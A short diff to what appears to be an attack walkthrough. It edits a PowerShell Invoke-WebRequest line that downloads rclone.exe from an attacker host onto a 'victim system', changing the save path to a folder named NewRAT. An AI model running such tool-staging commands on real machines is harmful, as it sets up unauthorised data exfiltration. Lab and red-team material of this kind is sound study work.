@@ -110,7 +110,7 @@ Invoke-WebRequest -Uri "http://<attacker-ip>:8000/rclone.exe" -OutFile "C:\Progr
 ```
 
 ```powershell
-Invoke-WebRequest -Uri "http://192.168.113.226:8000/rclone.exe" -OutFile "C:\ProgramData\rclone.exe"
+Invoke-WebRequest -Uri "http://192.168.113.226:8000/rclone.exe" -OutFile "C:\NewRAT\rclone.exe"
 ```
 
 Now `rclone.exe` and its config are on the **victim system**.
